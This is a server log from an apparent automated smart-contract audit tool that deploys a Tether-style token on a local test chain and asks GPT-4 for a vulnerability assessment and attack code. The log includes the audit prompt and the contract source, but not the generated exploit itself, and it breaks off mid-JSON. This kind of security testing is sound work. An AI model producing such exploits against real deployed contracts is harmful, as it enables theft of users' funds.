2025-07-05 13:21:47,497 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:21:47,499 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:21:47,500 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:21:47,502 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:21:47,504 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:21:47] "POST /analyze HTTP/1.1" 200 -
2025-07-05 13:21:49,107 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:21:49,110 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:21:49,115 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:21:49,118 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:21:49,120 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:21:49] "GET /history HTTP/1.1" 200 -
2025-07-05 13:22:33,745 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:22:33,762 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 13:22:33,775 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 13:22:33,779 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpi6hdzhyj.sol
2025-07-05 13:22:33,788 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 13:22:33,789 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 13:22:33,923 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.4.17+commit.bdeb9e52
2025-07-05 13:22:34,548 - solcx - INFO - solc 0.4.17 successfully installed at: /root/.solcx/solc-v0.4.17
2025-07-05 13:22:34,554 - solcx - INFO - Using solc version 0.4.17
2025-07-05 13:22:38,851 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:22:39,916 - app.services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-07-05 13:22:39,919 - app.services.contract_service - INFO - Deploying 4 contracts...
2025-07-05 13:22:40,353 - app.services.contract_service - INFO - Contract Ownable deployed at 0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7
2025-07-05 13:22:40,355 - app.services.contract_service - INFO - Setting up contract Ownable...
2025-07-05 13:22:40,498 - app.services.contract_service - INFO - Contract Ownable setup completed
2025-07-05 13:22:40,500 - app.services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-07-05 13:22:40,722 - app.services.contract_service - INFO - Contract Ownable funded
2025-07-05 13:22:41,164 - app.services.contract_service - INFO - Contract Pausable deployed at 0xe982E462b094850F12AF94d21D470e21bE9D0E9C
2025-07-05 13:22:41,166 - app.services.contract_service - INFO - Setting up contract Pausable...
2025-07-05 13:22:41,352 - app.services.contract_service - INFO - Contract Pausable setup completed
2025-07-05 13:22:41,353 - app.services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-07-05 13:22:41,519 - app.services.contract_service - INFO - Contract Pausable funded
2025-07-05 13:22:42,005 - app.services.contract_service - INFO - Contract SafeMath deployed at 0x59d3631c86BbE35EF041872d502F218A39FBa150
2025-07-05 13:22:42,007 - app.services.contract_service - INFO - Setting up contract SafeMath...
2025-07-05 13:22:42,037 - app.services.contract_service - INFO - Contract SafeMath setup completed
2025-07-05 13:22:42,038 - app.services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-07-05 13:22:42,275 - app.services.contract_service - INFO - Contract SafeMath funded
2025-07-05 13:22:43,408 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:22:43,680 - flask_cors.extension - DEBUG - Request to ''/analysis/status/2'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:22:43,682 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:22:43,684 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:22:43,686 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:22:43,687 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:22:43,689 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:22:43] "[33mOPTIONS /analysis/status/2 HTTP/1.1[0m" 404 -
2025-07-05 13:22:44,155 - app.services.contract_service - INFO - Contract TetherToken deployed at 0x0290FB167208Af455bB137780163b7B7a9a10C16
2025-07-05 13:22:44,157 - app.services.contract_service - INFO - Setting up contract TetherToken...
2025-07-05 13:22:48,109 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:22:49,288 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:22:49,947 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:22:50,118 - app.services.contract_service - INFO - Contract TetherToken setup completed
2025-07-05 13:22:50,120 - app.services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-07-05 13:22:50,283 - app.services.contract_service - INFO - Contract TetherToken funded
2025-07-05 13:22:50,285 - app.services.contract_service - INFO - Building contract observation...
2025-07-05 13:22:53,237 - app.services.contract_service - INFO - Contract observation built successfully
2025-07-05 13:22:53,241 - app.services.contract_service - INFO - Generating attack strategy...
2025-07-05 13:22:53,242 - app.services.contract_service - INFO - Running Slither analysis...
2025-07-05 13:22:53,252 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-07-05 13:22:53,266 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-07-05 13:22:53,268 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-05 13:22:53,269 - app.modules.attack_generator - INFO - Contract name: Ownable
2025-07-05 13:22:53,270 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-05 13:22:53,272 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-05 13:22:53,286 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:22:53,287 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:22:53,289 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:23:10,456 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:23:10,493 - app.modules.attack_generator - INFO - Received response from OpenAI API in 17.21 seconds
2025-07-05 13:23:10,500 - app.modules.attack_generator - INFO - Contract analysis completed in 17.21 seconds
2025-07-05 13:23:10,502 - app.modules.attack_generator - INFO - Vulnerability assessment: **

- **Centralization / Owner Privileges:**
  - Owner can arbitrarily blacklist any user and destro...
2025-07-05 13:23:10,504 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-05 13:23:10,506 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:23:10,508 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:23:10,510 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:23:14,423 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:23:14,451 - app.modules.attack_generator - INFO - Received response from OpenAI API in 3.94 seconds
2025-07-05 13:23:14,456 - app.modules.attack_generator - INFO - Attack code generation completed in 3.94 seconds
2025-07-05 13:23:14,459 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 749
2025-07-05 13:23:14,462 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 21.15 seconds
2025-07-05 13:23:14,465 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-05 13:23:14,477 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpi6hdzhyj.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857893180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          